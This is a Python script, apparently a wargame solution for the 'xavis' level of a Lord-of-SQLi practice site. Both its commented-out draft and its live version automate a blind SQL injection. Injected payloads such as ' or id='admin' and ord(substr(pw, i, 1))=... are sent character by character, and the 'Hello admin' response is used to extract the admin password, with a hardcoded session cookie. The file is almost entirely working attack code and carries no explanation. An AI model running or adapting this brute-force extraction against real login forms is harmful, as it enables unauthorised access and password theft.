# import urllib.request
# from urllib.parse import quote

# key = ""

# pwlen = 0

# for i in range(1, 50):
#     url = "http://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw="
#     data = "' or id='admin' and length(pw)='{}'#".format(str(i))
#     print(data)
#     data = quote(data)
#     re = urllib.request.Request(url + data)

#     re.add_header(
#         "User-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
#     re.add_header(
#         "Cookie", "PHPSESSID=jtkacptqj14heqvtcuofma30m2"
#     )

#     req = urllib.request.urlopen(re)

#     if str(req.read()).find("Hello admin") != -1:
#         pwlen = i
#         print('pw length : ' + str(pwlen))
#         break

# for i in range(1, pwlen + 1):
#     for j in range(32, 127):
#         url = "http://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw="
#         data = "' or id='admin' and substr(pw, 1, {})='{}'#".format(
#             str(i), key + chr(j))
#         print(data)
#         data = quote(data)
#         re = urllib.request.Request(url + data)

#         re.add_header(
#             "User-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
#         re.add_header(
#             "Cookie", "PHPSESSID=jtkacptqj14heqvtcuofma30m2"
#         )

#         req = urllib.request.urlopen(re)

#         if str(req.read()).find("Hello admin") != -1:
#             key += chr(j).lower()
#             print(key)
#             break
# print(key)

import urllib.request
from urllib.parse import quote

key = ""
hexcode = "0x"

pwlen = 40

for i in range(10, pwlen + 1):
    for j in range(0, 1000):  # 범위 확장
        url = "http://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw="
        data = "' or id='admin' and ord(substr(pw, {}, 1))='{}'#".format(
            str(i), str(j))
        print(data)
        data = quote(data)
        re = urllib.request.Request(url + data)

        re.add_header(
            "User-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
        re.add_header(
            "Cookie", "PHPSESSID=jtkacptqj14heqvtcuofma30m2"
        )

        req = urllib.request.urlopen(re)

        if str(req.read()).find("Hello admin") != -1:
            key += chr(j)
            hexcode += hex(j)[2:]
            print('key : ' + key)
            print('hex : ' + hexcode)
            break
print(key)